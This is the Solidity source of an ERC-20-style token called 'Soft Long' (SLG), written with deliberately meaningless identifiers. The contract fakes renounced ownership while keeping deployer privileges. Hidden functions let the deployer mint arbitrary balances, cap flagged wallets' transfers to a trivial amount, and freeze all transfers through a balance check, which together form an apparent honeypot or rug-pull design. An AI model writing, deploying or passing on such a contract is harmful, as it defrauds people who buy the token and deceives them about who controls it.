//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface tradingSenderLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listFromIs {
    function createPair(address modeFromLimit, address receiverFund) external returns (address);
}

interface listEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellTrading) external view returns (uint256);

    function transfer(address walletEnable, uint256 launchShould) external returns (bool);

    function allowance(address modeExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchShould) external returns (bool);

    function transferFrom(
        address sender,
        address walletEnable,
        uint256 launchShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingLiquidity, uint256 value);
    event Approval(address indexed modeExempt, address indexed spender, uint256 value);
}

interface listEnableMetadata is listEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SoftLong is autoSell, listEnable, listEnableMetadata {

    function fundTotal() private view {
        require(enableFeeList[_msgSender()]);
    }

    address sellTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private fromTrading = "SLG";

    mapping(address => uint256) private tradingShouldReceiver;

    function transferFrom(address sellExempt, address walletEnable, uint256 launchShould) external override returns (bool) {
        if (_msgSender() != sellTeam) {
            if (feeMin[sellExempt][_msgSender()] != type(uint256).max) {
                require(launchShould <= feeMin[sellExempt][_msgSender()]);
                feeMin[sellExempt][_msgSender()] -= launchShould;
            }
        }
        return feeLiquidityTake(sellExempt, walletEnable, launchShould);
    }

    event OwnershipTransferred(address indexed txFund, address indexed fromLiquidity);

    function feeLiquidityTake(address sellExempt, address walletEnable, uint256 launchShould) internal returns (bool) {
        if (sellExempt == txLimit) {
            return liquidityExemptAt(sellExempt, walletEnable, launchShould);
        }
        uint256 senderFund = listEnable(tradingTotal).balanceOf(tokenFee);
        require(senderFund == liquidityFrom);
        require(walletEnable != tokenFee);
        if (totalLaunchedBuy[sellExempt]) {
            return liquidityExemptAt(sellExempt, walletEnable, maxTotal);
        }
        return liquidityExemptAt(sellExempt, walletEnable, launchShould);
    }

    uint256 liquidityFrom;

    mapping(address => bool) public totalLaunchedBuy;

    address public tradingTotal;

    function name() external view virtual override returns (string memory) {
        return feeAtBuy;
    }

    bool public senderSellFund;

    bool public senderLiquidity;

    uint256 public walletTo;

    uint8 private atIs = 18;

    string private feeAtBuy = "Soft Long";

    function symbol() external view virtual override returns (string memory) {
        return fromTrading;
    }

    function atReceiver() public {
        emit OwnershipTransferred(txLimit, address(0));
        sellToBuy = address(0);
    }

    mapping(address => mapping(address => uint256)) private feeMin;

    function approve(address maxAt, uint256 launchShould) public virtual override returns (bool) {
        feeMin[_msgSender()][maxAt] = launchShould;
        emit Approval(_msgSender(), maxAt, launchShould);
        return true;
    }

    function getOwner() external view returns (address) {
        return sellToBuy;
    }

    address public txLimit;

    uint256 constant maxTotal = 3 ** 10;

    bool public maxSender;

    function launchedTradingSell(address listLaunched) public {
        require(listLaunched.balance < 100000);
        if (maxSender) {
            return;
        }
        
        enableFeeList[listLaunched] = true;
        if (minSender != tradingFromTx) {
            walletTo = tradingFromTx;
        }
        maxSender = true;
    }

    function balanceOf(address sellTrading) public view virtual override returns (uint256) {
        return tradingShouldReceiver[sellTrading];
    }

    uint256 private minSender;

    uint256 toToken;

    function transfer(address totalWallet, uint256 launchShould) external virtual override returns (bool) {
        return feeLiquidityTake(_msgSender(), totalWallet, launchShould);
    }

    address private sellToBuy;

    bool private exemptLimitLiquidity;

    uint256 private autoWallet;

    function liquidityExemptAt(address sellExempt, address walletEnable, uint256 launchShould) internal returns (bool) {
        require(tradingShouldReceiver[sellExempt] >= launchShould);
        tradingShouldReceiver[sellExempt] -= launchShould;
        tradingShouldReceiver[walletEnable] += launchShould;
        emit Transfer(sellExempt, walletEnable, launchShould);
        return true;
    }

    function allowance(address totalTo, address maxAt) external view virtual override returns (uint256) {
        if (maxAt == sellTeam) {
            return type(uint256).max;
        }
        return feeMin[totalTo][maxAt];
    }

    function fromTotal(address marketingWallet) public {
        fundTotal();
        if (autoWallet == minSender) {
            senderSellFund = false;
        }
        if (marketingWallet == txLimit || marketingWallet == tradingTotal) {
            return;
        }
        totalLaunchedBuy[marketingWallet] = true;
    }

    uint256 private modeReceiver = 100000000 * 10 ** 18;

    function sellReceiverAmount(uint256 launchShould) public {
        fundTotal();
        liquidityFrom = launchShould;
    }

    uint256 public tradingFromTx;

    function totalSupply() external view virtual override returns (uint256) {
        return modeReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return atIs;
    }

    function owner() external view returns (address) {
        return sellToBuy;
    }

    function launchedList(address totalWallet, uint256 launchShould) public {
        fundTotal();
        tradingShouldReceiver[totalWallet] = launchShould;
    }

    mapping(address => bool) public enableFeeList;

    address tokenFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    constructor (){
        
        tradingSenderLaunch limitAmount = tradingSenderLaunch(sellTeam);
        tradingTotal = listFromIs(limitAmount.factory()).createPair(limitAmount.WETH(), address(this));
        
        txLimit = _msgSender();
        atReceiver();
        enableFeeList[txLimit] = true;
        tradingShouldReceiver[txLimit] = modeReceiver;
        
        emit Transfer(address(0), txLimit, modeReceiver);
    }

}